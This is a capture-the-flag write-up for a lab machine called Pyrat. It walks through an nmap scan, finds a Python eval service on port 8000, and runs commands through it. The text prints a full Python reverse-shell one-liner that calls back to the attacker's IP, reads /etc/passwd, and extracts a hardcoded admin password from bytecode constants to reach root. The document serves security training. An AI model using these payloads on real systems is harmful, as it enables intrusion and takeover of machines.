@@ -1,0 +1,319 @@
+### INTRO
+##### Description:
+Pyrat receives a curious response from an HTTP server, which leads to a potential Python code execution vulnerability. With a cleverly crafted payload, it is possible to gain a shell on the machine. Delving into the directories, the author uncovers a well-known folder that provides a user with access to credentials. A subsequent exploration yields valuable insights into the application's older version. Exploring possible endpoints using a custom script, the user can discover a special endpoint and ingeniously expand their exploration by fuzzing passwords. The script unveils a password, ultimately granting access to the root.
+
+So, wellcome to this new writeup, this machines is mainly about enumeration, what always come in handy because in pentesting, around the 60% of the time is enumeration. Let's dig into it.
+
+### ENUMERATION
+At first sight, curl don't work on the usual port and in port 8000 it gives us a stange response:
+```
+❯ curl -X GET 10.130.155.190
+curl: (7) Failed to connect to 10.130.155.190 port 80 after 31 ms: Could not connect to server
+❯ curl -X GET 10.130.155.190:8000
+Try a more basic connection
+```
+
+We'll start by performing an nmap deep scan to enumerate all the possible information about the machine and its ports.
+```
+❯ nmap -sV -O -Pn -p- --min-rate 5000 10.130.155.190
+```
+The first nmap didn't responded well so i tried with a less demanding scan, i also used triple verbosity so i can see where the scan fails or faces some difficulty.
+```
+❯ nmap -sV -O -Pn -p- -T3 10.130.155.190 -vvv
+Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-17 14:04 CEST
+NSE: Loaded 47 scripts for scanning.
+Initiating Parallel DNS resolution of 1 host. at 14:04
+Completed Parallel DNS resolution of 1 host. at 14:04, 0.01s elapsed
+DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
+Initiating SYN Stealth Scan at 14:04
+Scanning 10.130.155.190 [65535 ports]
+Discovered open port 22/tcp on 10.130.155.190
+Discovered open port 8000/tcp on 10.130.155.190
+Completed SYN Stealth Scan at 14:04, 14.11s elapsed (65535 total ports)
+Initiating Service scan at 14:04
+Scanning 2 services on 10.130.155.190
+Stats: 0:01:33 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
+Service scan Timing: About 50.00% done; ETC: 14:07 (0:01:19 remaining)
+Stats: 0:02:21 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
+Service scan Timing: About 50.00% done; ETC: 14:08 (0:02:07 remaining)
+PORT     STATE SERVICE  REASON         VERSION
+22/tcp   open  ssh      syn-ack ttl 62 OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
+8000/tcp open  http-alt syn-ack ttl 62 SimpleHTTP/0.6 Python/3.11.2
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port8000-TCP:V=7.95%I=7%D=4/17%Time=69E221E6%P=x86_64-pc-linux-gnu%r(Ge
+SF:nericLines,1,"\n")%r(GetRequest,1A,"name\x20'GET'\x20is\x20not\x20defin
+SF:ed\n")%r(X11Probe,2D,"source\x20code\x20string\x20cannot\x20contain\x20
+SF:null\x20bytes\n")%r(FourOhFourRequest,22,"invalid\x20syntax\x20\(<strin
+SF:g>,\x20line\x201\)\n")%r(Socks4,2D,"source\x20code\x20string\x20cannot\
+SF:x20contain\x20null\x20bytes\n")%r(HTTPOptions,1E,"name\x20'OPTIONS'\x20
+SF:is\x20not\x20defined\n")%r(RTSPRequest,1E,"name\x20'OPTIONS'\x20is\x20n
+SF:ot\x20defined\n")%r(DNSVersionBindReqTCP,2D,"source\x20code\x20string\x
+SF:20cannot\x20contain\x20null\x20bytes\n")%r(DNSStatusRequestTCP,2D,"sour
+SF:ce\x20code\x20string\x20cannot\x20contain\x20null\x20bytes\n")%r(Help,1
+SF:B,"name\x20'HELP'\x20is\x20not\x20defined\n")%r(LPDString,22,"invalid\x
+SF:20syntax\x20\(<string>,\x20line\x201\)\n")%r(SIPOptions,22,"invalid\x20
+SF:syntax\x20\(<string>,\x20line\x201\)\n")%r(LANDesk-RC,2D,"source\x20cod
+SF:e\x20string\x20cannot\x20contain\x20null\x20bytes\n")%r(NotesRPC,2D,"so
+SF:urce\x20code\x20string\x20cannot\x20contain\x20null\x20bytes\n")%r(Java
+SF:RMI,2D,"source\x20code\x20string\x20cannot\x20contain\x20null\x20bytes\
+SF:n")%r(afp,2D,"source\x20code\x20string\x20cannot\x20contain\x20null\x20
+SF:bytes\n")%r(giop,2D,"source\x20code\x20string\x20cannot\x20contain\x20n
+SF:ull\x20bytes\n");
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.95%E=4%D=4/17%OT=22%CT=1%CU=37913%PV=Y%DS=3%DC=I%G=Y%TM=69E2228
+OS:F%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)SEQ
+OS:(SP=105%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=106%GCD=1%ISR=108%TI=Z%
+OS:CI=Z%II=I%TS=A)SEQ(SP=107%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=10A%G
+OS:CD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M4E8ST11NW7%O2=M4E8ST11NW7%O3=M4
+OS:E8NNT11NW7%O4=M4E8ST11NW7%O5=M4E8ST11NW7%O6=M4E8ST11)WIN(W1=F4B3%W2=F4B3
+OS:%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M4E8NNSNW7%C
+OS:C=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%
+OS:T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD
+OS:=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S
+OS:=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK
+OS:=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)
+
+Uptime guess: 25.573 days (since Sun Mar 22 23:22:40 2026)
+Network Distance: 3 hops
+TCP Sequence Prediction: Difficulty=262 (Good luck!)
+IP ID Sequence Generation: All zeros
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Read data files from: /usr/share/nmap
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 194.18 seconds
+           Raw packets sent: 65664 (2.893MB) | Rcvd: 65611 (2.628MB)
+```
+
+The scan results are the typical errors that an interactive Python interpreter throws when you feed it text that it doesn't recognize as valid code.
+This means that we are not dealing with a traditional web server, but rather with a raw socket that is capturing everything it receives on port 8000.
+
+Basically, we already know that `curl` won't work here; we need `netcat`.
+
+Ok, we can confirm that netcat connects through TCP and is esentially python:
+```
+❯ nc 10.130.155.190 8000
+print("Hello there!")
+Hello there!
+```
+
+As I figured, the `import os;` command wasn't going to work (it would have been too easy), so we'll keep exploring what else we can do here.
+```
+❯ nc 10.130.155.190 8000
+print("Hello there!")
+Hello there!
+
+import os; os.system('whoami')         
+
+os.system('whoami')
+```
+
+But what if we changed our approach a little? We know there’s no output on the screen, but that doesn’t mean the command didn’t work, right?
+
+Take a look:
+```
+❯ nc 10.130.155.190 8000
+print(os.popen('whoami').read())
+www-data
+```
+
+So the commands are working, let's shoot our first shot!
+
+### EXPLOIT
+We start a listener on out machine, in port `5555`
+```
+❯ nc -lvnp 5555
+listening on [any] 5555 ...
+```
+
+And now we craft the payload in order to get a reverse shell:
+```
+import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.135.112",5555));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")
+```
+
+Now we send it through `❯ nc 10.130.155.190 8000` and we should receive a reverse shell on out netcat listener.
+```
+❯ nc -lvnp 5555
+listening on [any] 5555 ...
+connect to [192.168.135.112] from (UNKNOWN) [10.130.155.190] 33596
+bash: /root/.bashrc: Permission denied
+www-data@ip-10-130-155-190:~$ ls
+ls
+ls: cannot open directory '.': Permission denied
+www-data@ip-10-130-155-190:~$ cd ..
+cd ..
+www-data@ip-10-130-155-190:/$ ls
+ls
+bin   dev  home  lib32	libx32	   media  opt	root  sbin  swap.img  tmp  var
+boot  etc  lib	lib64	lost+found  mnt    proc  run   srv   sys       usr
+www-data@ip-10-130-155-190:/$ cd home   
+cd home
+www-data@ip-10-130-155-190:/home$ ls
+ls
+think  ubuntu
+www-data@ip-10-130-155-190:/home$ cd think
+cd think
+bash: cd: think: Permission denied
+www-data@ip-10-130-155-190:/home$  
+```
+
+Well! So now we have our reverse shell, but there's a problem: we're logged in as www-data, which isn't exactly a real user on the system.
+
+We don't have permission to see /etc/shadow but we can see /etc/passwd:
+```
+www-data@ip-10-130-155-190:/home$ cat /etc/shadow
+cat /etc/shadow
+cat: /etc/shadow: Permission denied
+www-data@ip-10-130-155-190:/home$ cat /etc/passwd
+cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
+syslog:x:104:110::/home/syslog:/usr/sbin/nologin
+_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
+tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
+uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
+tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
+landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:110:1::/var/cache/pollinate:/bin/false
+usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
+think:x:1000:1000:,,,:/home/think:/bin/bash
+fwupd-refresh:x:113:117:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
+postfix:x:114:119::/var/spool/postfix:/usr/sbin/nologin
+ubuntu:x:1001:1002:Ubuntu:/home/ubuntu:/bin/bash
+www-data@ip-10-130-155-190:/home$ 
+```
+
+We don't have many permissions; we're pretty limited, BUT, WE KNOW HOW WE GOT IN, so we know there's a Python interpreter script lying around somewhere.
+I started by making a `find` but ended up returning so much noise. Then i tried to `grep` the `ps aux` in order to see the proccesses running on the system:
+
+```
+www-data@ip-10-130-155-190:/$ ps aux | grep python | grep -v "grep"
+ps aux | grep python | grep -v "grep"
+root         676  0.0  0.9  29676 18628 ?        Ss   11:57   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
+root         734  0.0  0.0   2616   596 ?        Ss   11:57   0:00 /bin/sh -c python3 /root/pyrat.py 2>/dev/null
+root         735  0.0  0.7  21872 14672 ?        S    11:57   0:00 python3 /root/pyrat.py
+root         746  0.0  0.6 390640 12476 ?        Sl   11:57   0:00 python3 /root/pyrat.py
+root         761  0.0  1.0 107948 20868 ?        Ssl  11:57   0:00 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
+www-data    2192  0.0  0.6  22260 12576 ?        S    12:25   0:00 python3 /root/pyrat.py
+www-data@ip-10-130-155-190:/$ 
+```
+
+As we can see, we have a `pyrat.py` at `/root/pyrat.py` and it's running under root permissions, interesting! 
+
+I tried `print(dir())` but the environment is pretty restricted.
+```
+❯ nc 10.130.155.190 8000
+import __main__; print(dir(__main__))
+['StringIO', '__annotations__', '__builtins__', '__cached__', '__doc__', '__file__', '__loader__', '__name__', '__package__', '__spec__', '__warningregistry__', 'admins', 'change_uid', 'datetime', 'exec_python', 'fake_http', 'get_admin', 'handle_client', 'host', 'is_http', 'manager', 'multiprocessing', 'os', 'port', 'remove_socket', 'send_data', 'shell', 'socket', 'start_server', 'switch_case', 'sys']
+import __main__; print(__main__.admins)
+[]
+
+import __main__; __main__.shell()
+shell() missing 1 required positional argument: 'client_socket'
+import __main__; print(__main__.get_admin)
+<function get_admin at 0x7fb8910ccf70>
+
+__main__.get_admin()
+name '__main__' is not defined
+```
+
+After doing some testing, I discovered that we could import the variable itself to call the function and execute it:
+```
+import __main__; __main__.shell(client_socket)
+$ whoami
+whoami
+www-data
+```
+
+So i tried with `get_admin`:
+```
+❯ nc 10.130.155.190 8000
+import __main__; __main__.get_admin(client_socket)
+Start a fresh client to begin.
+```
+
+Can the `get_admin` function only be executed as the first action of a connection, or does it perhaps detect that your current socket has already been “contaminated” by other commands?
+```
+❯ nc 10.130.155.190 8000
+admin
+Password:
+admin
+Password:
+pyrat
+Password:
+root
+```
+
+Let's try the reasoning from before: the password is most likely NOT in the `get_admin` function, but it is hardcoded in the script.
+```
+import __main__; print(__main__.get_admin.__code__.co_consts)
+(None, 0, 'Start a fresh client to begin.', 'abc123', 3, 'Password:', 1024, 'utf-8', 'Welcome Admin!!! Type "shell" to begin')
+```
+Indeed it is! `abc123`
+
+```
+❯ nc 10.130.155.190 8000
+admin
+Password:
+abc123
+Welcome Admin!!! Type "shell" to begin
+shell
+# whoami
+whoami
+root
+# 
+```
+
+### GETTING THE FLAGS
+And now we just have to retrieve the flags!! 
+```
+# pwd
+pwd
+/root
+# ls -l
+ls -l
+total 16
+-rwxr-xr-x 1 root root 5360 Apr 15  2024 pyrat.py
+-rw-r----- 1 root root   33 Jun 15  2023 root.txt
+drwxrwx--- 3 root root 4096 Jun  2  2023 snap
+# cat root.txt
+cat root.txt
+XxxxxxxxxRootFlagxxxxxxxxxxxxxxX
+# cd /home/think
+cd /home/think
+# ls
+ls
+snap  user.txt
+# cat user.txt
+cat user.txt
+XxxxxxxxxxxxxUserFlagxxxxxxxxxxX
+```
+
+### ENDING!
+On this machine, we learned that an application’s security depends not only on operating system permissions, but also on the robustness of its own code and how it manages the execution context. We began by identifying an anomalous service using `nmap`; since it did not follow a standard protocol, this allowed us to interact directly with a raw Python interpreter. Through object introspection and access to the `__main__` module, we were able to perform “hot reverse engineering,” reading the bytecode constants (`co_consts`) to extract credentials that were not visible in physical files. This process taught us that an attacker with the ability to execute code, no matter how limited the environment, can escalate privileges by exploiting the application’s internal logic and the process’s memory if it runs with elevated permissions, such as `root` privileges.
+
+Congratulations! we've successfully completed the Pyrat room!! 
